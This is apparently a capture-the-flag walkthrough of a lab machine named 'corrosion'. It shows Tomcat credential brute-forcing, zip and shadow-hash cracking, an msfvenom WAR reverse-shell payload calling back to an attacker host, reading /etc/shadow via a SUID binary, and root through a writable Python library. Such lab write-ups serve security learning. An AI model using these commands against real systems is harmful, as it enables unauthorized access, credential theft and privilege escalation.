There aren’t that many interesting ports up on the system. The only thing that stands out is the Tomcat running on port 8080. That is a common service used in vulnerable machines, so let’s go ahead and perform our enumeration on it.

![1](https://github.com/user-attachments/assets/797f866b-a801-4aca-8b3e-5493de13d296)


We see that the website is up and running.

Based on the information we have at hand, we can try our hand at bruteforcing common credentials and see if we can get a quick win.

```bash
msfconsole
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOST 192.168.56.137
RHOST => 192.168.56.137
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

```

It seems the default credentials didn’t work. 

I tried running it through a different wordlist but that didn’t pan out either. So it seems we need to perform some more enumeration. So I decided to do some directory busting.

I tried directory busting port 80, but that didn’t yield any results so I tried busting 8080 to see what we could find. A regular feroxbuster scan didn’t reveal anything so I thought of adding some common extensions to it.

```bash
feroxbuster -u http://192.168.56.137:8080 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -n -t 100 -x zip,txt,php

```

Most of the results were just tomcat items, but there was an odd one out there, backup.zip. I decided to download that file and unzip it but it was password protected.

```bash
unzip backup.zip
Archive:  backup.zip
[backup.zip] catalina.policy password: 
   skipping: catalina.policy         incorrect password
   skipping: context.xml             incorrect password
   skipping: catalina.properties     incorrect password
   skipping: jaspic-providers.xml    incorrect password
   skipping: jaspic-providers.xsd    incorrect password
   skipping: logging.properties      incorrect password
   skipping: server.xml              incorrect password
   skipping: tomcat-users.xml        incorrect password
   skipping: tomcat-users.xsd        incorrect password
   skipping: web.xml                 incorrect password
```

So it seems we need to perform some more bruteforcing. I used zip2john to retrieve the hash and store it in another file, and then crack it using John.

```bash
john hash.hash --show
backup.zip:@administrator_hi5::backup.zip:jaspic-providers.xml, context.xml, tomcat-users.xsd, jaspic-providers.xsd, logging.properties, tomcat-users.xml, catalina.properties, server.xml:backup.zip

1 password hash cracked, 0 left
```

We get the password @administrator_hi5

Using that to unzip the file we get a few files back

```bash
ls
catalina.policy  catalina.properties  context.xml  jaspic-providers.xml  jaspic-providers.xsd  logging.properties  server.xml  tomcat-users.xml  tomcat-users.xsd  web.xml
```

The most interesting file here is the tomcat-users.xml since that contains credentials for the tomcat manager app which will allow us to get a shell.

```bash
<role rolename="manager-gui"/>
<user username="manager" password="melehifokivai" roles="manager-gui"/>
```

We get the username and password for the tomcat manager app. We can now login and upload our shell.

We have the capability of uploading a WAR file which can be abused to run malicious applications using the tomcat manager. We can create a malicious WAR file using msfvenom to get us a reverse shell.

![2](https://github.com/user-attachments/assets/eed1581b-79d9-49c6-9b72-e3844306f174)


```bash
msfvenom -p java/shell_reverse_tcp lhost=192.168.56.103 lport=4242 -f war -o shell.war 
```

We can see that our shell has been uploaded

![3](https://github.com/user-attachments/assets/8efb8fa5-d5a1-4aa4-8518-65e464025b94)


Now all we need to do is visit that endpoint and our malicious application will run giving us a reverse shell. So let’s set up a listener and wait for a connection.

```bash
nc -lvnp 4242             
listening on [any] 4242 ...
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.137] 47414
whoami
tomcat
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

There we go, we now have access to the system as the tomcat user. Now time for some Privilege Escalation. But before that I’ll quickly upgrade the shell to a more interactive one

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@corrosion:/var/spool/cron$ ^Z
zsh: suspended  nc -lvnp 4242
                                                                                                                                                                                                                                            
stty raw -echo; fg                                  
[1]  + continued  nc -lvnp 4242

tomcat@corrosion:/var/spool/cron$ 
tomcat@corrosion:/var/spool/cron$ export TERM=xterm
tomcat@corrosion:/var/spool/cron$ 
```

There we go now we have autocomplete and other features so we can navigate the system efficiently.

After some looking around I was able to access the randy user’s home, and get the user.txt for that user.

After looking around common places in the system and not finding anything I decided to run linpeas but didn’t manage to find anything interesting.

Then I thought to try for Password Re-Use. So I listed all the users in /home

```bash
tomcat@corrosion:/home$ ls
jaye  randy
```

We can see two users. I tried using the tomcat password with both of them, and using it on jaye worked and gave me access.

```bash
tomcat@corrosion:/home$ su jaye
Password: 
$ whoami
jaye
```

I decided to check out the home directory of jaye and found an interesting file

```bash
jaye@corrosion:~$ ls * -l
Desktop:

```

We can see that there is a look file with the SUID bit enabled which will allow us to look at any file. We can use this to get the /etc/shadow file to get hashes for any user.

```bash
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::

```

I then decided to crack the hashes for root and randy using john the ripper. After a long while I was able to get the password for randy.

```bash
john hash3.hash --show             
randy:07051986randy:1000:1000:randy,,,:/home/randy:/bin/bash

1 password hash cracked, 0 left
```

We now have access to the randy user

```bash
randy@corrosion:~$ sudo -l
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```

Using sudo -l we can see that randy can run the randombase64 script as root. Let’s take a look at what the script is doing.

```bash
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```

It seems to just be encoding a string to base64. We don’t seem to have write privileges on this file, although we can check to see if we have write privileges on the base64 library.

```bash
randy@corrosion:~$ ls -l /usr/lib/python3.8/base64.py 
-rwxrwxrwx 1 root root 20386 Sep 20  2021 /usr/lib/python3.8/base64.py
```

We do have write access on the base64 library. We can now just add our malicious code in there and run the script using sudo and we will have root.

```bash
import os
os.system("/bin/bash")
```

I added the above script to get a shell directly

```bash
root@corrosion:/home/randy# whoami
root
```

And there we go we have root.

```bash
root@corrosion:~# cat root.txt 
2fdbf8d4f894292361d6c72c8e833a4b
```
